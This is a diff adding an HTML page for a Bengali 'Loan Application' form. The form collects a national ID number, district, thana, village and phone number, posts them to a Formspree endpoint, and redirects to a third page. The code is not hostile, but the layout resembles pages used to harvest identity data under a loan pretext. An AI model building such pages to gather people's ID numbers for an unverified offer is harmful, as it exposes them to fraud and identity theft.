@@ -1,0 +1,97 @@
+<!-- page2.html -->
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Loan Application - Page 2</title>
+  <style>
+    body{
+      margin:0;
+      min-height:100vh;
+      display:grid;
+      place-items:center;
+      font-family:sans-serif;
+      background:#d90429; /* লাল ব্যাকগ্রাউন্ড */
+      color:#fff;
+    }
+    .card{
+      width:min(90vw,600px);
+      text-align:left;
+      padding:32px;
+      background:rgba(255,255,255,0.06);
+      border-radius:20px;
+      box-shadow:0 8px 24px rgba(0,0,0,0.3);
+    }
+    h2{text-align:center;margin:0 0 20px}
+    label{display:block;margin-bottom:6px;font-weight:bold}
+    input{
+      width:100%;
+      padding:10px;
+      margin-bottom:18px;
+      border-radius:8px;
+      border:none;
+      font-size:16px;
+    }
+    .btn{
+      display:block;
+      width:100%;
+      text-align:center;
+      padding:14px 22px;
+      border-radius:999px;
+      font-weight:bold;
+      background:#ffcc00; /* হলুদ বোতাম */
+      color:#000;
+      text-decoration:none;
+      box-shadow:0 6px 16px rgba(0,0,0,.25);
+      border:none;
+      cursor:pointer;
+    }
+    .btn:hover{opacity:0.9}
+  </style>
+</head>
+<body>
+  <main class="card">
+    <h2>তথ্য দিন</h2>
+
+    <!-- ✅ Formspree ফর্ম -->
+    <form id="myForm" action="https://formspree.io/f/mjkonnjp" method="POST">
+      <label for="nid">1. আপনার NID নাম্বার</label>
+      <input type="number" id="nid" name="nid" placeholder="NID নাম্বার লিখুন" required />
+
+      <label for="zilla">2. জেলা</label>
+      <input type="text" id="zilla" name="zilla" placeholder="জেলার নাম লিখুন" required />
+
+      <label for="thana">3. থানা</label>
+      <input type="text" id="thana" name="thana" placeholder="থানার নাম লিখুন" required />
+
+      <label for="gram">4. গ্রাম</label>
+      <input type="text" id="gram" name="gram" placeholder="গ্রামের নাম লিখুন" required />
+
+      <label for="phone">5. ফোন নম্বর</label>
+      <input type="tel" id="phone" name="phone" inputmode="numeric" placeholder="ফোন নম্বর লিখুন" required />
+
+      <button type="submit" class="btn">আবেদন করুন</button>
+    </form>
+    <!-- ✅ Formspree ফর্ম শেষ -->
+  </main>
+
+  <script>
+    const form = document.getElementById("myForm");
+    form.addEventListener("submit", async function(e) {
+      e.preventDefault();
+      let response = await fetch(form.action, {
+        method: form.method,
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+      });
+      if (response.ok) {
+        // ✅ সফল হলে সরাসরি 3 নাম্বার পেজে যাবে
+        window.location.href = "page3.html";
+      } else {
+        alert("সাবমিট করতে সমস্যা হয়েছে, আবার চেষ্টা করুন!");
+      }
+    });
+  </script>
+</body>
+</html>
